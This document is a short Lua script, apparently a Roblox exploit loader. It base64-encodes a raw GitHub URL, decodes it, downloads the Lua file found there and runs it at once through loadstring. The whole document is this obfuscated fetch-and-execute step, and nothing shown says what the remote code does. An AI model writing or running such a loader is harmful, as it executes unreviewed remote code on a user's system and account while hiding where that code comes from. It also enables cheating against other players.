local encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RvdGFsbHlmZXIvZnRmLWZlL21haW4vbWFpbi5sdWE="
local url = game:GetService("HttpService"):Base64Decode(encoded)
loadstring(game:HttpGet(url))()
